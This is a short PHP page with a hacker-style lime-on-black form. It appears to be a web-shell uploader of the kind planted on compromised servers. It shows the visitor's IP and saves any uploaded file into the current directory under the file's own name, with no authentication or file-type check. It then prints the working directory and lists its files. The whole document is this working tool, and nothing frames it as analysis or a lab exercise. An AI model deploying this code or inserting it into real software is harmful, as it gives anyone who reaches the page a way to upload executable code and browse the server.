<?php
print "Host IP: ".$_SERVER['REMOTE_ADDR'];

if(!empty($_FILES['uploaded_file']))
{
  $path = "";
  $path = $path . basename( $_FILES['uploaded_file']['name']);

  if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
    echo "<br>";
    echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
    " has been uploaded";
  } else{
      echo "<br>";
      echo "There was an error uploading the file, please try again!";
  }
}

echo "<br><br>";
echo getcwd();
$dir = getcwd();
$file = scandir($dir);

echo "<br>";
print_r($file);

?>

<html>
<head>
<style>
body {
    background-color:black;
    color:lime;
}
</style>
</head>
<body>
    
    <form action="" method="POST" enctype="multipart/form-data">
         <input type="file" name="uploaded_file">
         <input type="submit" value="Upload file">

    </form>
</body>
</html>
